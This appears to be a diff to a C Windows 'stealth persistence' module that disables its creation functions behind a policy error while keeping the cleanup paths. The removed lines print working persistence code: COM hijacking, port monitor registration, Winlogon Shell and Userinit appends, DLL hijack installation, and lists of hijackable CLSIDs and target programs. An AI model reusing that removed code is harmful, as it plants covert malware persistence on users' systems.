@@ -1,12 +1,10 @@
 /*
- * Stealth Persistence Module - Implementation
+ * Stealth Persistence Module - Legacy Cleanup Implementation
  *
- * Alternative persistence mechanisms for W6 workstream.
- *
- * Ported from:
- * - nccgroup/acCOMplice (MIT) - COM hijacking toolkit
- * - airzero24/PortMonitorPersist (MIT) - Port monitor persistence
- * - cocomelonc tutorials - C++ examples
+ * Alternate persistence creation is not part of the retained runtime contract.
+ * Creation and re-establish entrypoints fail closed with
+ * ERROR_ACCESS_DISABLED_BY_POLICY; removal/read paths remain so old residue can
+ * be cleaned deterministically.
  */
 
 #include "stealth_persistence.h"
@@ -18,6 +16,10 @@
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "winspool.lib")
 
+#ifndef ERROR_ACCESS_DISABLED_BY_POLICY
+#define ERROR_ACCESS_DISABLED_BY_POLICY 1260L
+#endif
+
 /* Registry paths */
 #define HKCU_CLSID_PATH L"SOFTWARE\\Classes\\CLSID"
 #define HKLM_CLSID_PATH L"SOFTWARE\\Classes\\CLSID"
@@ -26,6 +28,32 @@
 
 /* Default capacity for state store */
 #define INITIAL_PERSIST_CAPACITY 32
+
+static BOOL Persist_BlockCreationByPolicyA(const char* operation)
+{
+    char message[256];
+
+    SetLastError(ERROR_ACCESS_DISABLED_BY_POLICY);
+    if (operation != NULL && operation[0] != '\0') {
+        sprintf_s(message, sizeof(message),
+                  "Stealth persistence %s blocked by rundll32-only lifecycle policy",
+                  operation);
+        OutputDebugStringA(message);
+    }
+
+    return FALSE;
+}
+
+static BOOL Persist_IsCreationType(PersistenceType type)
+{
+    return type == PERSIST_COM_HIJACK ||
+           type == PERSIST_PORT_MONITOR ||
+           type == PERSIST_WINLOGON_SHELL ||
+           type == PERSIST_WINLOGON_USERINIT ||
+           type == PERSIST_DLL_HIJACK ||
+           type == PERSIST_SCHEDULED_TASK ||
+           type == PERSIST_WMI_SUBSCRIPTION;
+}
 
 /* ================================================================
  * COM Hijacking Functions
@@ -38,54 +66,15 @@ BOOL Persist_ComHijackRegister(
     size_t backupValueCch)
 {
     if (clsid == NULL || dllPath == NULL) {
+        SetLastError(ERROR_INVALID_PARAMETER);
         return FALSE;
     }
 
-    /* Build registry path: HKCU\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32 */
-    WCHAR keyPath[512];
-    StringCchPrintfW(keyPath, 512, L"%s\\%s\\InprocServer32", HKCU_CLSID_PATH, clsid);
-
-    /* First, check if CLSID exists in HKLM (legitimate COM object) */
-    WCHAR hklmPath[512];
-    StringCchPrintfW(hklmPath, 512, L"%s\\%s", HKLM_CLSID_PATH, clsid);
-
-    HKEY hTestKey;
-    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, hklmPath, 0, KEY_READ, &hTestKey) != ERROR_SUCCESS) {
-        return FALSE; /* CLSID doesn't exist in HKLM */
-    }
-    RegCloseKey(hTestKey);
-
-    /* Backup existing HKCU value if present */
     if (outBackupValue != NULL && backupValueCch > 0) {
         outBackupValue[0] = L'\0';
-        HKEY hBackupKey;
-        if (RegOpenKeyExW(HKEY_CURRENT_USER, keyPath, 0, KEY_READ, &hBackupKey) == ERROR_SUCCESS) {
-            DWORD size = (DWORD)(backupValueCch * sizeof(WCHAR));
-            RegQueryValueExW(hBackupKey, NULL, NULL, NULL, (LPBYTE)outBackupValue, &size);
-            RegCloseKey(hBackupKey);
-        }
     }
 
-    /* Create HKCU key and set InprocServer32 default value */
-    HKEY hKey;
-    if (RegCreateKeyExW(HKEY_CURRENT_USER, keyPath, 0, NULL, REG_OPTION_NON_VOLATILE,
-                        KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
-        return FALSE;
-    }
-
-    /* Set default value to DLL path */
-    DWORD size = (DWORD)((wcslen(dllPath) + 1) * sizeof(WCHAR));
-    LONG result = RegSetValueExW(hKey, NULL, 0, REG_SZ, (LPBYTE)dllPath, size);
-
-    /* Set ThreadingModel */
-    if (result == ERROR_SUCCESS) {
-        const WCHAR* threading = L"Both";
-        size = (DWORD)((wcslen(threading) + 1) * sizeof(WCHAR));
-        RegSetValueExW(hKey, L"ThreadingModel", 0, REG_SZ, (LPBYTE)threading, size);
-    }
-
-    RegCloseKey(hKey);
-    return (result == ERROR_SUCCESS);
+    return Persist_BlockCreationByPolicyA("COM hijack registration");
 }
 
 BOOL Persist_ComHijackRemove(
@@ -151,45 +140,12 @@ DWORD Persist_ComFindHijackable(
     DWORD maxClsids)
 {
     if (outClsids == NULL || maxClsids == 0) {
+        SetLastError(ERROR_INVALID_PARAMETER);
         return 0;
     }
 
-    /* Well-known hijackable CLSIDs that are commonly loaded */
-    static const WCHAR* knownHijackable[] = {
-        CLSID_MMDEVICE_ENUMERATOR,   /* Audio device enumerator */
-        L"{42aedc87-2188-41fd-b9a3-0c966feabec1}", /* CLSID_NewStartMenuShellFolder */
-        L"{9BBBB3C9-AF0F-4E03-82C9-8C2B2A7EB3FC}", /* Shell CopyHook handler */
-    };
-
-    DWORD count = 0;
-    for (DWORD i = 0; i < sizeof(knownHijackable)/sizeof(knownHijackable[0]) && count < maxClsids; i++) {
-        /* Check if CLSID exists in HKLM but not yet in HKCU */
-        WCHAR hklmPath[512];
-        StringCchPrintfW(hklmPath, 512, L"%s\\%s", HKLM_CLSID_PATH, knownHijackable[i]);
-
-        HKEY hKey;
-        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, hklmPath, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-            RegCloseKey(hKey);
-
-            /* Check HKCU doesn't already have it */
-            WCHAR hkcuPath[512];
-            StringCchPrintfW(hkcuPath, 512, L"%s\\%s", HKCU_CLSID_PATH, knownHijackable[i]);
-
-            if (RegOpenKeyExW(HKEY_CURRENT_USER, hkcuPath, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
-                /* Not in HKCU - hijackable */
-                size_t len = wcslen(knownHijackable[i]) + 1;
-                outClsids[count] = (WCHAR*)HeapAlloc(GetProcessHeap(), 0, len * sizeof(WCHAR));
-                if (outClsids[count] != NULL) {
-                    StringCchCopyW(outClsids[count], len, knownHijackable[i]);
-                    count++;
-                }
-            } else {
-                RegCloseKey(hKey);
-            }
-        }
-    }
-
-    return count;
+    (void)Persist_BlockCreationByPolicyA("COM hijack target discovery");
+    return 0;
 }
 
 /* ================================================================
@@ -201,34 +157,11 @@ BOOL Persist_PortMonitorRegister(
     const WCHAR* dllPath)
 {
     if (monitorName == NULL || dllPath == NULL) {
+        SetLastError(ERROR_INVALID_PARAMETER);
         return FALSE;
     }
 
-    /* Build registry path */
-    WCHAR keyPath[512];
-    StringCchPrintfW(keyPath, 512, L"%s\\%s", PRINT_MONITORS_PATH, monitorName);
-
-    /* Create key */
-    HKEY hKey;
-    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, NULL, REG_OPTION_NON_VOLATILE,
-                        KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
-        return FALSE;
-    }
-
-    /* Extract just the DLL filename */
-    const WCHAR* dllName = wcsrchr(dllPath, L'\\');
-    if (dllName != NULL) {
-        dllName++; /* Skip backslash */
-    } else {
-        dllName = dllPath;
-    }
-
-    /* Set Driver value */
-    DWORD size = (DWORD)((wcslen(dllName) + 1) * sizeof(WCHAR));
-    LONG result = RegSetValueExW(hKey, L"Driver", 0, REG_SZ, (LPBYTE)dllName, size);
-
-    RegCloseKey(hKey);
-    return (result == ERROR_SUCCESS);
+    return Persist_BlockCreationByPolicyA("port monitor registration");
 }
 
 BOOL Persist_PortMonitorRemove(const WCHAR* monitorName)
@@ -266,15 +199,11 @@ BOOL Persist_PortMonitorAddImmediate(
     const WCHAR* dllPath)
 {
     if (monitorName == NULL || dllPath == NULL) {
+        SetLastError(ERROR_INVALID_PARAMETER);
         return FALSE;
     }
 
-    MONITOR_INFO_2W mi = {0};
-    mi.pName = (LPWSTR)monitorName;
-    mi.pEnvironment = L"Windows x64";
-    mi.pDLLName = (LPWSTR)dllPath;
-
-    return AddMonitorW(NULL, 2, (LPBYTE)&mi);
+    return Persist_BlockCreationByPolicyA("port monitor immediate load");
 }
 
 /* ================================================================
@@ -287,45 +216,15 @@ BOOL Persist_WinlogonShellAppend(
     size_t originalValueCch)
 {
     if (exePath == NULL) {
+        SetLastError(ERROR_INVALID_PARAMETER);
         return FALSE;
     }
 
-    /* Read current Shell value */
-    WCHAR currentShell[1024] = {0};
-    HKEY hKey;
-
-    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, WINLOGON_PATH, 0, KEY_READ | KEY_WRITE, &hKey) != ERROR_SUCCESS) {
-        return FALSE;
-    }
-
-    DWORD size = sizeof(currentShell);
-    DWORD type = 0;
-    LONG result = RegQueryValueExW(hKey, L"Shell", NULL, &type, (LPBYTE)currentShell, &size);
-
-    if (result != ERROR_SUCCESS || currentShell[0] == L'\0') {
-        StringCchCopyW(currentShell, 1024, L"explorer.exe");
-    }
-
-    /* Backup original */
     if (outOriginalValue != NULL && originalValueCch > 0) {
-        StringCchCopyW(outOriginalValue, originalValueCch, currentShell);
+        outOriginalValue[0] = L'\0';
     }
 
-    /* Check if already appended */
-    if (wcsstr(currentShell, exePath) != NULL) {
-        RegCloseKey(hKey);
-        return TRUE; /* Already present */
-    }
-
-    /* Append our executable */
-    WCHAR newShell[1024];
-    StringCchPrintfW(newShell, 1024, L"%s,%s", currentShell, exePath);
-
-    size = (DWORD)((wcslen(newShell) + 1) * sizeof(WCHAR));
-    result = RegSetValueExW(hKey, L"Shell", 0, REG_SZ, (LPBYTE)newShell, size);
-
-    RegCloseKey(hKey);
-    return (result == ERROR_SUCCESS);
+    return Persist_BlockCreationByPolicyA("Winlogon Shell append");
 }
 
 BOOL Persist_WinlogonShellRestore(const WCHAR* originalValue)
@@ -352,44 +251,15 @@ BOOL Persist_WinlogonUserinitAppend(
     size_t originalValueCch)
 {
     if (exePath == NULL) {
+        SetLastError(ERROR_INVALID_PARAMETER);
         return FALSE;
     }
 
-    WCHAR currentUserinit[1024] = {0};
-    HKEY hKey;
-
-    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, WINLOGON_PATH, 0, KEY_READ | KEY_WRITE, &hKey) != ERROR_SUCCESS) {
-        return FALSE;
-    }
-
-    DWORD size = sizeof(currentUserinit);
-    DWORD type = 0;
-    LONG result = RegQueryValueExW(hKey, L"Userinit", NULL, &type, (LPBYTE)currentUserinit, &size);
-
-    if (result != ERROR_SUCCESS || currentUserinit[0] == L'\0') {
-        StringCchCopyW(currentUserinit, 1024, L"C:\\Windows\\system32\\userinit.exe,");
-    }
-
-    /* Backup original */
     if (outOriginalValue != NULL && originalValueCch > 0) {
-        StringCchCopyW(outOriginalValue, originalValueCch, currentUserinit);
+        outOriginalValue[0] = L'\0';
     }
 
-    /* Check if already appended */
-    if (wcsstr(currentUserinit, exePath) != NULL) {
-        RegCloseKey(hKey);
-        return TRUE;
-    }
-
-    /* Append our executable */
-    WCHAR newUserinit[1024];
-    StringCchPrintfW(newUserinit, 1024, L"%s%s,", currentUserinit, exePath);
-
-    size = (DWORD)((wcslen(newUserinit) + 1) * sizeof(WCHAR));
-    result = RegSetValueExW(hKey, L"Userinit", 0, REG_SZ, (LPBYTE)newUserinit, size);
-
-    RegCloseKey(hKey);
-    return (result == ERROR_SUCCESS);
+    return Persist_BlockCreationByPolicyA("Winlogon Userinit append");
 }
 
 BOOL Persist_WinlogonUserinitRestore(const WCHAR* originalValue)
@@ -419,29 +289,13 @@ DWORD Persist_DllHijackFindTargets(
     DWORD maxTargets)
 {
     if (outTargets == NULL || maxTargets == 0) {
+        SetLastError(ERROR_INVALID_PARAMETER);
         return 0;
     }
 
-    /* Known DLL hijack targets */
-    static const struct {
-        const WCHAR* dllName;
-        const WCHAR* targetExe;
-    } knownTargets[] = {
-        { L"version.dll", L"KeePassXC.exe" },
-        { L"WINMM.dll", L"notepad.exe" },
-        { L"dwmapi.dll", L"explorer.exe" },
-    };
-
-    DWORD count = 0;
-    for (DWORD i = 0; i < sizeof(knownTargets)/sizeof(knownTargets[0]) && count < maxTargets; i++) {
-        StringCchCopyW(outTargets[count].dllName, 64, knownTargets[i].dllName);
-        StringCchCopyW(outTargets[count].targetExe, MAX_PATH, knownTargets[i].targetExe);
-        /* Hijack path would be in same directory as target exe */
-        outTargets[count].hijackPath[0] = L'\0';
-        count++;
-    }
-
-    return count;
+    ZeroMemory(outTargets, maxTargets * sizeof(DllHijackTarget));
+    (void)Persist_BlockCreationByPolicyA("DLL hijack target discovery");
+    return 0;
 }
 
 BOOL Persist_DllHijackInstall(
@@ -450,15 +304,11 @@ BOOL Persist_DllHijackInstall(
     const WCHAR* payloadDllPath)
 {
     if (dllName == NULL || hijackPath == NULL || payloadDllPath == NULL) {
+        SetLastError(ERROR_INVALID_PARAMETER);
         return FALSE;
     }
 
-    /* Build full path */
-    WCHAR fullPath[MAX_PATH];
-    StringCchPrintfW(fullPath, MAX_PATH, L"%s\\%s", hijackPath, dllName);
-
-    /* Copy payload DLL to hijack location */
-    return CopyFileW(payloadDllPath, fullPath, FALSE);
+    return Persist_BlockCreationByPolicyA("DLL hijack installation");
 }
 
 BOOL Persist_DllHijackRemove(const WCHAR* hijackPath)
@@ -475,14 +325,12 @@ BOOL Persist_DllHijackGenerateProxy(
     const WCHAR* outputPath,
     const WCHAR* payloadDllPath)
 {
-    /* Generating a proxy DLL requires code generation
-     * This is a placeholder - actual implementation would need
-     * to generate a DLL that exports all functions from original
-     * and loads payload */
-    (void)originalDllPath;
-    (void)outputPath;
-    (void)payloadDllPath;
-    return FALSE;
+    if (originalDllPath == NULL || outputPath == NULL || payloadDllPath == NULL) {
+        SetLastError(ERROR_INVALID_PARAMETER);
+        return FALSE;
+    }
+
+    return Persist_BlockCreationByPolicyA("DLL hijack proxy generation");
 }
 
 /* ================================================================
@@ -831,6 +679,16 @@ BOOL Persist_StateAddEntry(
     const WCHAR* backupData)
 {
     if (state == NULL || identifier == NULL) {
+        SetLastError(ERROR_INVALID_PARAMETER);
+        return FALSE;
+    }
+
+    if (Persist_IsCreationType(type)) {
+        return Persist_BlockCreationByPolicyA("state entry creation for disabled persistence");
+    }
+
+    if (state->entryCapacity == 0) {
+        SetLastError(ERROR_INVALID_DATA);
         return FALSE;
     }
 
@@ -866,6 +724,7 @@ BOOL Persist_StateAddEntry(
 BOOL Persist_RemoveAll(PersistenceState* state)
 {
     if (state == NULL) {
+        SetLastError(ERROR_INVALID_PARAMETER);
         return FALSE;
     }
 
@@ -981,19 +840,22 @@ BOOL Persist_RestoreAll(PersistenceState* state)
         if (!entry->active) {
             switch (entry->type) {
                 case PERSIST_COM_HIJACK:
-                    if (Persist_ComHijackRegister(entry->identifier, entry->targetPath, NULL, 0)) {
-                        entry->active = TRUE;
-                    } else {
-                        success = FALSE;
-                    }
+                    Persist_BlockCreationByPolicyA("COM hijack re-establish");
+                    success = FALSE;
                     break;
 
                 case PERSIST_PORT_MONITOR:
-                    if (Persist_PortMonitorRegister(entry->identifier, entry->targetPath)) {
-                        entry->active = TRUE;
-                    } else {
-                        success = FALSE;
-                    }
+                    Persist_BlockCreationByPolicyA("port monitor re-establish");
+                    success = FALSE;
+                    break;
+
+                case PERSIST_WINLOGON_SHELL:
+                case PERSIST_WINLOGON_USERINIT:
+                case PERSIST_DLL_HIJACK:
+                case PERSIST_SCHEDULED_TASK:
+                case PERSIST_WMI_SUBSCRIPTION:
+                    Persist_BlockCreationByPolicyA("disabled persistence re-establish");
+                    success = FALSE;
                     break;
 
                 default:
